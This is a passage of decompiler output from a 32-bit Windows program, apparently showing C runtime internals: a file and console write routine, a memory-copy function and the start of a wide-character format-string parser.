  if (((cVar12 == '\x02') || (cVar12 == '\x01')) && ((~(uint)param_5 & 1) == 0)) {
    puVar6 = (undefined4 *)FUN_0040cabd();
    *puVar6 = 0;
    puVar6 = (undefined4 *)FUN_0040caaa();
    *puVar6 = 0x16;
    FUN_0040ca42();
    param_2 = extraout_EDX_00;
    goto LAB_0041035e;
  }
  if ((*(byte *)(*piVar14 + iVar16 + 4) & 0x20) != 0) {
    FUN_0041544f(param_3,0,0,2);
  }
  bVar4 = FUN_004156d3(param_3);
  param_2 = extraout_EDX_01;
  if ((CONCAT31(extraout_var,bVar4) == 0) || ((*(byte *)(iVar16 + 4 + *piVar14) & 0x80) == 0)) {
LAB_0040ffcf:
    if ((*(byte *)((HANDLE *)(*piVar14 + iVar16) + 1) & 0x80) == 0) {
      BVar8 = WriteFile(*(HANDLE *)(*piVar14 + iVar16),local_1ad0,(DWORD)param_5,
                        (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
      if (BVar8 == 0) {
LAB_004102cf:
        local_1ac4 = GetLastError();
        param_2 = extraout_EDX_14;
      }
      else {
        local_1ac4 = 0;
        local_1acc = local_1ad8;
        param_2 = extraout_EDX_13;
      }
LAB_004102db:
      if (local_1acc != (WCHAR *)0x0) goto LAB_0041035e;
      goto LAB_004102e4;
    }
    local_1ac4 = 0;
    if (cVar12 == '\0') {
      local_1ac8 = local_1ad0;
      if (param_5 == (WCHAR *)0x0) goto LAB_00410320;
      do {
        local_1ac0 = (WCHAR *)0x0;
        pWVar11 = (WCHAR *)((int)local_1ac8 - (int)local_1ad0);
        pWVar13 = local_1abc;
        do {
          if (param_5 <= pWVar11) break;
          pWVar1 = (WCHAR *)((int)local_1ac8 + 1);
          cVar12 = *(char *)local_1ac8;
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          if (cVar12 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar13 = '\r';
            pWVar13 = (WCHAR *)((int)pWVar13 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          *(char *)pWVar13 = cVar12;
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          local_1ac8 = pWVar1;
        } while (local_1ac0 < (WCHAR *)0x13ff);
        BVar8 = WriteFile(*(HANDLE *)(iVar16 + *piVar14),local_1abc,(int)pWVar13 - (int)local_1abc,
                          (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
        if (BVar8 == 0) goto LAB_004102cf;
        local_1acc = (WCHAR *)((int)local_1acc + (int)local_1ad8);
        param_2 = extraout_EDX_09;
      } while (((int)pWVar13 - (int)local_1abc <= (int)local_1ad8) &&
              (piVar14 = local_1adc, (WCHAR *)((int)local_1ac8 - (int)local_1ad0) < param_5));
      goto LAB_004102db;
    }
    local_1ac0 = local_1ad0;
    if (cVar12 == '\x02') {
      if (param_5 != (WCHAR *)0x0) {
        do {
          local_1ac8 = (WCHAR *)0x0;
          pWVar11 = (WCHAR *)((int)local_1ac0 - (int)local_1ad0);
          pWVar13 = local_1abc;
          do {
            if (param_5 <= pWVar11) break;
            pWVar1 = local_1ac0 + 1;
            WVar2 = *local_1ac0;
            pWVar11 = pWVar11 + 1;
            if (WVar2 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar13 = L'\r';
              pWVar13 = pWVar13 + 1;
              local_1ac8 = local_1ac8 + 1;
            }
            local_1ac8 = local_1ac8 + 1;
            *pWVar13 = WVar2;
            pWVar13 = pWVar13 + 1;
            local_1ac0 = pWVar1;
          } while (local_1ac8 < (WCHAR *)0x13fe);
          BVar8 = WriteFile(*(HANDLE *)(iVar16 + *piVar14),local_1abc,(int)pWVar13 - (int)local_1abc
                            ,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar8 == 0) goto LAB_004102cf;
          local_1acc = (WCHAR *)((int)local_1acc + (int)local_1ad8);
          param_2 = extraout_EDX_10;
        } while (((int)pWVar13 - (int)local_1abc <= (int)local_1ad8) &&
                (piVar14 = local_1adc, (WCHAR *)((int)local_1ac0 - (int)local_1ad0) < param_5));
        goto LAB_004102db;
      }
    }
    else if (param_5 != (WCHAR *)0x0) {
      do {
        local_1ac8 = (WCHAR *)0x0;
        pWVar11 = (WCHAR *)((int)local_1ac0 - (int)local_1ad0);
        pWVar13 = local_6bc;
        do {
          if (param_5 <= pWVar11) break;
          WVar2 = *local_1ac0;
          local_1ac0 = local_1ac0 + 1;
          pWVar11 = pWVar11 + 1;
          if (WVar2 == L'\n') {
            *pWVar13 = L'\r';
            pWVar13 = pWVar13 + 1;
            local_1ac8 = local_1ac8 + 1;
          }
          local_1ac8 = local_1ac8 + 1;
          *pWVar13 = WVar2;
          pWVar13 = pWVar13 + 1;
        } while (local_1ac8 < (WCHAR *)0x6a8);
        pcVar15 = (char *)0x0;
        iVar9 = WideCharToMultiByte(0xfde9,0,local_6bc,((int)pWVar13 - (int)local_6bc) / 2,
                                    local_1414,0xd55,(LPCSTR)0x0,(LPBOOL)0x0);
        if (iVar9 == 0) goto LAB_004102cf;
        do {
          BVar8 = WriteFile(*(HANDLE *)(iVar16 + *local_1adc),local_1414 + (int)pcVar15,
                            iVar9 - (int)pcVar15,(LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar8 == 0) {
            local_1ac4 = GetLastError();
            param_2 = extraout_EDX_12;
            break;
          }
          pcVar15 = pcVar15 + (int)local_1ad8;
          param_2 = extraout_EDX_11;
        } while ((int)pcVar15 < iVar9);
      } while ((iVar9 <= (int)pcVar15) &&
              (local_1acc = (WCHAR *)((int)local_1ac0 - (int)local_1ad0), local_1acc < param_5));
      goto LAB_004102db;
    }
  }
  else {
    pauVar7 = FUN_0040cdba();
    local_1ae4 = (uint)(*(int *)(*(int *)(pauVar7[6] + 0xc) + 0x14) == 0);
    BVar8 = GetConsoleMode(*(HANDLE *)(iVar16 + *piVar14),&local_1ae8);
    param_2 = extraout_EDX_02;
    if ((BVar8 == 0) || ((local_1ae4 != 0 && (cVar12 == '\0')))) goto LAB_0040ffcf;
    local_1ae8 = GetConsoleCP();
    local_1ac8 = (WCHAR *)0x0;
    param_2 = extraout_EDX_03;
    if (param_5 != (WCHAR *)0x0) {
      local_1ac0 = (WCHAR *)0x0;
      DVar10 = extraout_ECX;
      pWVar13 = local_1ad0;
      do {
        piVar14 = local_1adc;
        if (local_1add == '\0') {
          bVar4 = *(byte *)pWVar13;
          local_1ae4 = (uint)(bVar4 == 10);
          iVar9 = *local_1adc + iVar16;
          if (*(int *)(iVar9 + 0x38) == 0) {
            uVar17 = FUN_00415965(bVar4);
            if ((int)uVar17 == 0) {
              uVar18 = 1;
              pWVar11 = pWVar13;
              goto LAB_0040fe36;
            }
            if ((uint)(((int)local_1ad0 - (int)pWVar13) + (int)param_5) < 2) {
              param_2 = CONCAT31((int3)((ulonglong)uVar17 >> 0x28),*(undefined *)pWVar13);
              local_1acc = (WCHAR *)((int)local_1acc + 1);
              *(undefined *)(iVar16 + 0x34 + *piVar14) = *(undefined *)pWVar13;
              *(undefined4 *)(iVar16 + 0x38 + *piVar14) = 1;
              break;
            }
            uVar17 = FUN_00415913((LPWSTR)&local_1ac4,(byte *)pWVar13,2);
            param_2 = (undefined4)((ulonglong)uVar17 >> 0x20);
            if ((int)uVar17 == -1) break;
            pWVar13 = (WCHAR *)((int)pWVar13 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          else {
            local_10._0_1_ = *(CHAR *)(iVar9 + 0x34);
            *(undefined4 *)(iVar9 + 0x38) = 0;
            uVar18 = 2;
            pWVar11 = &local_10;
            local_10._1_1_ = bVar4;
LAB_0040fe36:
            uVar17 = FUN_00415913((LPWSTR)&local_1ac4,(byte *)pWVar11,uVar18);
            param_2 = (undefined4)((ulonglong)uVar17 >> 0x20);
            if ((int)uVar17 == -1) break;
          }
          pWVar13 = (WCHAR *)((int)pWVar13 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          DVar10 = WideCharToMultiByte(local_1ae8,0,(LPCWSTR)&local_1ac4,1,(LPSTR)&local_10,5,
                                       (LPCSTR)0x0,(LPBOOL)0x0);
          param_2 = extraout_EDX_04;
          if (DVar10 == 0) break;
          BVar8 = WriteFile(*(HANDLE *)(iVar16 + *local_1adc),&local_10,DVar10,(LPDWORD)&local_1ac8,
                            (LPOVERLAPPED)0x0);
          if (BVar8 == 0) goto LAB_004102cf;
          local_1acc = (WCHAR *)((int)local_1ac0 + local_1ad4);
          param_2 = extraout_EDX_05;
          if ((int)local_1ac8 < (int)DVar10) break;
          DVar10 = local_1ad4;
          if (local_1ae4 != 0) {
            local_10._0_1_ = '\r';
            BVar8 = WriteFile(*(HANDLE *)(iVar16 + *local_1adc),&local_10,1,(LPDWORD)&local_1ac8,
                              (LPOVERLAPPED)0x0);
            if (BVar8 == 0) goto LAB_004102cf;
            param_2 = extraout_EDX_06;
            if ((int)local_1ac8 < 1) break;
            local_1ad4 = local_1ad4 + 1;
            local_1acc = (WCHAR *)((int)local_1acc + 1);
            DVar10 = extraout_ECX_00;
          }
        }
        else {
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            local_1ac4 = (DWORD)(ushort)*pWVar13;
            DVar10 = (DWORD)(*pWVar13 == L'\n');
            pWVar13 = pWVar13 + 1;
            local_1ac0 = local_1ac0 + 1;
            local_1ae4 = DVar10;
          }
          if ((local_1add == '\x01') || (local_1add == '\x02')) {
            DVar3 = local_1ac4;
            sVar5 = FUN_00415737(DVar10,param_2,(short)local_1ac4);
            DVar10 = DVar3;
            if (sVar5 != (short)local_1ac4) goto LAB_004102cf;
            local_1acc = local_1acc + 1;
            param_2 = extraout_EDX_07;
            if (local_1ae4 != 0) {
              local_1ac4 = 0xd;
              DVar3 = 0xd;
              sVar5 = FUN_00415737(DVar10,extraout_EDX_07,0xd);
              DVar10 = DVar3;
              if (sVar5 != (short)local_1ac4) goto LAB_004102cf;
              local_1acc = (WCHAR *)((int)local_1acc + 1);
              local_1ad4 = local_1ad4 + 1;
              param_2 = extraout_EDX_08;
            }
          }
        }
      } while (local_1ac0 < param_5);
      goto LAB_004102db;
    }
LAB_004102e4:
    piVar14 = local_1adc;
    if (local_1ac4 != 0) {
      if (local_1ac4 == 5) {
        puVar6 = (undefined4 *)FUN_0040caaa();
        *puVar6 = 9;
        puVar6 = (undefined4 *)FUN_0040cabd();
        *puVar6 = 5;
        param_2 = extraout_EDX_15;
      }
      else {
        FUN_0040cad0(local_1ac4);
        param_2 = extraout_EDX_16;
      }
      goto LAB_0041035e;
    }
  }
LAB_00410320:
  if (((*(byte *)(iVar16 + 4 + *piVar14) & 0x40) == 0) || (*(char *)local_1ad0 != '\x1a')) {
    puVar6 = (undefined4 *)FUN_0040caaa();
    *puVar6 = 0x1c;
    puVar6 = (undefined4 *)FUN_0040cabd();
    *puVar6 = 0;
    param_2 = extraout_EDX_17;
  }
LAB_0041035e:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,param_2);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0041036b(void)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 extraout_EDX;
  int unaff_EBP;
  int iVar4;
  uint uVar5;
  
  FUN_0040d634(&DAT_004205a0,0x10);
  uVar5 = *(uint *)(unaff_EBP + 8);
  if (uVar5 == 0xfffffffe) {
    puVar1 = (undefined4 *)FUN_0040cabd();
    *puVar1 = 0;
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 9;
  }
  else {
    if ((-1 < (int)uVar5) && (uVar5 < DAT_004257ac)) {
      iVar3 = (int)uVar5 >> 5;
      iVar4 = (uVar5 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_004257c0)[iVar3] + 4 + iVar4) & 1) != 0) {
        FUN_00414ae5();
        *(undefined4 *)(unaff_EBP + -4) = 0;
        if ((*(byte *)((&DAT_004257c0)[iVar3] + 4 + iVar4) & 1) == 0) {
          puVar1 = (undefined4 *)FUN_0040caaa();
          *puVar1 = 9;
          puVar1 = (undefined4 *)FUN_0040cabd();
          *puVar1 = 0;
          *(undefined4 *)(unaff_EBP + -0x1c) = 0xffffffff;
        }
        else {
          uVar2 = FUN_0040fc38(uVar5,extraout_EDX,*(uint *)(unaff_EBP + 8),
                               *(WCHAR **)(unaff_EBP + 0xc),*(WCHAR **)(unaff_EBP + 0x10));
          *(undefined4 *)(unaff_EBP + -0x1c) = uVar2;
        }
        *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
        FUN_0041043d();
        return *(undefined4 *)(unaff_EBP + -0x1c);
      }
    }
    puVar1 = (undefined4 *)FUN_0040cabd();
    *puVar1 = 0;
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 9;
    FUN_0040ca42();
  }
  return 0xffffffff;
}



void FUN_0041043d(void)

{
  int unaff_EBP;
  
  FUN_00414b85(*(uint *)(unaff_EBP + 8));
  return;
}



undefined4 * __cdecl FUN_00410450(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar1 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = param_3 >> 2;
      uVar3 = param_3 & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return param_1;
        case 2:
          goto switchD_00410633_caseD_2;
        case 3:
          goto switchD_00410633_caseD_3;
        }
        goto switchD_00410633_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_00410633_caseD_0;
      case 1:
        goto switchD_00410633_caseD_1;
      case 2:
        goto switchD_00410633_caseD_2;
      case 3:
        goto switchD_00410633_caseD_3;
      default:
        uVar2 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00410633_caseD_2;
            case 3:
              goto switchD_00410633_caseD_3;
            }
            goto switchD_00410633_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00410633_caseD_2;
            case 3:
              goto switchD_00410633_caseD_3;
            }
            goto switchD_00410633_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00410633_caseD_2;
            case 3:
              goto switchD_00410633_caseD_3;
            }
            goto switchD_00410633_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_00410633_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return param_1;
    case 2:
switchD_00410633_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return param_1;
    case 3:
switchD_00410633_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
      return param_1;
    }
switchD_00410633_caseD_0:
    return param_1;
  }
  if (((0xff < param_3) && (DAT_00425778 != 0)) && (((uint)param_1 & 0xf) == ((uint)param_2 & 0xf)))
  {
    puVar1 = FUN_00413396(param_1,param_2,param_3);
    return puVar1;
  }
  puVar1 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar2 = param_3 >> 2;
    uVar3 = param_3 & 3;
    if (7 < uVar2) {
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar1 = *param_2;
        param_2 = param_2 + 1;
        puVar1 = puVar1 + 1;
      }
      switch(uVar3) {
      case 0:
        return param_1;
      case 2:
        goto switchD_004104ac_caseD_2;
      case 3:
        goto switchD_004104ac_caseD_3;
      }
      goto switchD_004104ac_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_004104ac_caseD_0;
    case 1:
      goto switchD_004104ac_caseD_1;
    case 2:
      goto switchD_004104ac_caseD_2;
    case 3:
      goto switchD_004104ac_caseD_3;
    default:
      uVar2 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar3 = uVar2 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar1 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar2) {
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + 1;
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return param_1;
          case 2:
            goto switchD_004104ac_caseD_2;
          case 3:
            goto switchD_004104ac_caseD_3;
          }
          goto switchD_004104ac_caseD_1;
        }
        break;
      case 2:
        uVar3 = uVar2 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar2 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar1 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar2) {
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + 1;
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return param_1;
          case 2:
            goto switchD_004104ac_caseD_2;
          case 3:
            goto switchD_004104ac_caseD_3;
          }
          goto switchD_004104ac_caseD_1;
        }
        break;
      case 3:
        uVar3 = uVar2 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar2 = uVar2 >> 2;
        puVar1 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar2) {
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + 1;
            puVar1 = puVar1 + 1;
          }
          switch(uVar3) {
          case 0:
            return param_1;
          case 2:
            goto switchD_004104ac_caseD_2;
          case 3:
            goto switchD_004104ac_caseD_3;
          }
          goto switchD_004104ac_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar2) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 7] = param_2[uVar2 - 7];
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 6] = param_2[uVar2 - 6];
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 5] = param_2[uVar2 - 5];
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 4] = param_2[uVar2 - 4];
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 3] = param_2[uVar2 - 3];
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar1[uVar2 - 2] = param_2[uVar2 - 2];
  case 4:
  case 5:
  case 6:
  case 7:
    puVar1[uVar2 - 1] = param_2[uVar2 - 1];
    param_2 = param_2 + uVar2;
    puVar1 = puVar1 + uVar2;
  }
  switch(uVar3) {
  case 1:
switchD_004104ac_caseD_1:
    *(undefined *)puVar1 = *(undefined *)param_2;
    return param_1;
  case 2:
switchD_004104ac_caseD_2:
    *(undefined *)puVar1 = *(undefined *)param_2;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_004104ac_caseD_3:
    *(undefined *)puVar1 = *(undefined *)param_2;
    *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
    *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
    return param_1;
  }
switchD_004104ac_caseD_0:
  return param_1;
}



void __fastcall FUN_004107b5(undefined4 param_1,undefined4 param_2,WCHAR param_3)

{
  short sVar1;
  WCHAR **in_EAX;
  int *unaff_ESI;
  
  if (((*(byte *)(in_EAX + 3) & 0x40) == 0) || (in_EAX[2] != (WCHAR *)0x0)) {
    sVar1 = FUN_004159ab(param_1,param_2,param_3,in_EAX);
    if (sVar1 == -1) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



void __fastcall FUN_004107e4(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  undefined4 uVar1;
  int *in_EAX;
  undefined4 extraout_EDX;
  
  do {
    if (param_4 < 1) {
      return;
    }
    param_4 = param_4 + -1;
    uVar1 = param_3;
    FUN_004107b5(param_1,param_2,(WCHAR)param_3);
    param_1 = uVar1;
    param_2 = extraout_EDX;
  } while (*in_EAX != -1);
  return;
}



void __fastcall FUN_0041080b(WCHAR *param_1,undefined4 param_2,int param_3)

{
  WCHAR *pWVar1;
  int *in_EAX;
  int *piVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  WCHAR *pWVar3;
  int unaff_EDI;
  
  pWVar3 = param_1;
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    while (0 < param_3) {
      param_3 = param_3 + -1;
      pWVar1 = (WCHAR *)(uint)(ushort)*pWVar3;
      FUN_004107b5(param_1,param_2,*pWVar3);
      param_1 = pWVar1;
      pWVar3 = pWVar3 + 1;
      param_2 = extraout_EDX;
      if (*in_EAX == -1) {
        piVar2 = (int *)FUN_0040caaa();
        if (*piVar2 != 0x2a) {
          return;
        }
        param_1 = (WCHAR *)0x3f;
        FUN_004107b5(extraout_ECX,extraout_EDX_00,L'?');
        param_2 = extraout_EDX_01;
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_3;
  }
  return;
}



// WARNING: Type propagation algorithm not settling

void __cdecl FUN_0041085d(int param_1,ushort *param_2,undefined (**param_3) [16],int **param_4)

{
  WCHAR WVar1;
  ushort uVar2;
  undefined4 *puVar3;
  uint uVar4;
  undefined2 extraout_var_00;
  int iVar5;
  undefined3 extraout_var;
  int iVar6;
  code *pcVar7;
  undefined (**ppauVar8) [16];
  undefined (**extraout_ECX) [16];
  int extraout_ECX_00;
  undefined (**extraout_ECX_01) [16];
  int extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int extraout_EDX_02;
  int extraout_EDX_03;
  int extraout_EDX_04;
  int extraout_EDX_05;
  int *piVar9;
  int extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 uVar10;
  int extraout_EDX_09;
  int extraout_EDX_10;
  int extraout_EDX_11;
  int extraout_EDX_12;
  int extraout_EDX_13;
  undefined *puVar11;
  int **ppiVar12;
  int *piVar13;
  undefined (**ppauVar14) [16];
  ushort *puVar15;
  bool bVar16;
  undefined8 uVar17;
  undefined (**ppauVar18) [16];
  undefined (**ppauVar19) [16];
  int *local_470;
  int *local_46c;
  undefined (**local_468) [16];
  ushort *local_464;
  undefined4 local_460;
  undefined (**local_45c) [16];
  int local_458;
  int local_454;
  undefined (*local_450 [2]) [16];
  int local_448;
  char local_444;
  int local_440;
  byte local_43c;
  undefined local_43b;
  uint local_438;
  WCHAR local_434;
  short local_432;
  int *local_430;
  int local_42c;
  int local_428;
  int local_424;
  undefined (**local_420) [16];
  int **local_41c;
  undefined (**local_418) [16];
  undefined (**local_414) [16];
  int *local_410;
  uint local_40c;
  undefined (*local_408 [127]) [16];
  undefined local_209 [513];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_440 = param_1;
  local_41c = param_4;
  local_458 = 0;
  local_40c = 0;
  local_430 = (int *)0x0;
  local_410 = (int *)0x0;
  local_428 = 0;
  local_454 = 0;
  local_42c = 0;
  FUN_0040b970(local_450,param_3);
  if (param_1 == 0) {
switchD_0041099e_caseD_9:
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0x16;
  }
  else {
    if (param_2 != (ushort *)0x0) {
      ppauVar8 = (undefined (**) [16])(uint)*param_2;
      local_424 = 0;
      local_418 = (undefined (**) [16])0x0;
      local_438 = 0;
      local_45c = (undefined (**) [16])0x0;
      iVar6 = extraout_EDX;
      local_420 = ppauVar8;
      if (*param_2 != 0) {
        do {
          iVar6 = 2;
          puVar15 = param_2 + 1;
          local_464 = puVar15;
          local_420 = ppauVar8;
          if (local_424 < 0) break;
          WVar1 = (WCHAR)ppauVar8;
          if ((ushort)(WVar1 + L'￠') < 0x59) {
            uVar4 = *(byte *)(ppauVar8 + 0x10729a) & 0xf;
          }
          else {
            uVar4 = 0;
          }
          local_438 = (uint)((byte)(&DAT_0041ca88)[local_438 + uVar4 * 9] >> 4);
          ppiVar12 = local_41c;
          switch(local_438) {
          case 0:
switchD_0041099e_caseD_0:
            local_42c = 1;
            FUN_004107b5(ppauVar8,2,WVar1);
            iVar6 = extraout_EDX_01;
            ppiVar12 = param_4;
            break;
          case 1:
            local_410 = (int *)0xffffffff;
            local_460 = 0;
            local_454 = 0;
            local_430 = (int *)0x0;
            local_428 = 0;
            local_40c = 0;
            local_42c = 0;
            ppiVar12 = param_4;
            break;
          case 2:
            if (ppauVar8 == (undefined (**) [16])0x20) {
              local_40c = local_40c | 2;
              ppiVar12 = param_4;
            }
            else if (ppauVar8 == (undefined (**) [16])0x23) {
              local_40c = local_40c | 0x80;
              ppiVar12 = param_4;
            }
            else if (ppauVar8 == (undefined (**) [16])0x2b) {
              local_40c = local_40c | 1;
              ppiVar12 = param_4;
            }
            else if (ppauVar8 == (undefined (**) [16])0x2d) {
              local_40c = local_40c | 4;
              ppiVar12 = param_4;
            }
            else if (ppauVar8 == (undefined (**) [16])0x30) {
              local_40c = local_40c | 8;
              ppiVar12 = param_4;
            }
            break;
          case 3:
            if (WVar1 == L'*') {
              local_430 = *param_4;
              local_41c = param_4 + 1;
              ppiVar12 = local_41c;
              if ((int)local_430 < 0) {
                local_40c = local_40c | 4;
                local_430 = (int *)-(int)local_430;
              }
            }
            else {
              local_430 = (int *)((int)local_430 * 10 + -0x30 + (int)ppauVar8);
              ppiVar12 = param_4;
            }
            break;
          case 4:
            local_410 = (int *)0x0;
            ppiVar12 = param_4;
            break;
          case 5:
            if (WVar1 == L'*') {
              local_410 = *param_4;
              local_41c = param_4 + 1;
              ppiVar12 = local_41c;
              if ((int)local_410 < 0) {
                local_410 = (int *)0xffffffff;
              }
            }
            else {
              local_410 = (int *)((int)local_410 * 10 + -0x30 + (int)ppauVar8);
              ppiVar12 = param_4;
            }
            break;
          case 6:
